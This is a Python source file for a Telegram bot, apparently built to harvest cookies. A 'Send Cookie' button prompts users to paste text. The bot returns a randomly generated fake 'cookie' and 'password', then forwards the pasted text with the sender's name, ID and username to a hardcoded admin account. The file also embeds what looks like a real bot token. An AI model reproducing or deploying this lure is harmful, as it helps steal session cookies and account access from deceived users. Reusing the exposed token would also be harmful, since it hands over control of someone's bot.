from aiogram import Bot, Dispatcher, F
from aiogram.filters import CommandStart
from aiogram.types import Message, KeyboardButton, ReplyKeyboardMarkup
import asyncio
import random
import string

BOT_TOKEN = "8655043591:AAG5FAYxKGGMUkkZbnNinzz8mBuGWR5boHc"
ADMIN_ID = 7377897946

bot = Bot(BOT_TOKEN)
dp = Dispatcher()

waiting = set()

keyboard = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="🍪 Отправить Cookie")]],
    resize_keyboard=True
)

def generate_cookie(length=12):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

@dp.message(CommandStart())
async def start(message: Message):
    await message.answer(
        "Нажми «Отправить Cookie» и отправь текст.",
        reply_markup=keyboard
    )

@dp.message(F.text == "🍪 Отправить Cookie")
async def get_cookie(message: Message):
    waiting.add(message.from_user.id)
    await message.answer("Отправь текст для получения Cookie:")

@dp.message()
async def handle_text(message: Message):
    if message.from_user.id not in waiting:
        return

    waiting.remove(message.from_user.id)
    user_text = message.text
    fake_cookie = generate_cookie()

    # Экранируем спецсимволы для MarkdownV2
    fake_cookie_escaped = fake_cookie.replace('!', '\\!').replace('.', '\\.').replace('-', '\\-')
    text_escaped = user_text.replace('!', '\\!').replace('.', '\\.').replace('-', '\\-')

    await message.answer(
        f"🍪 Cookie получена\n\nПароль: ||{fake_cookie_escaped}||",
        parse_mode="MarkdownV2"
    )

    username = f"@{message.from_user.username}" if message.from_user.username else "Нет"
    await bot.send_message(
        ADMIN_ID,
        f"📩 Новое сообщение\n\n👤 {message.from_user.full_name}\n🆔 {message.from_user.id}\n🔗 {username}\n\n{text_escaped}"
    )

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())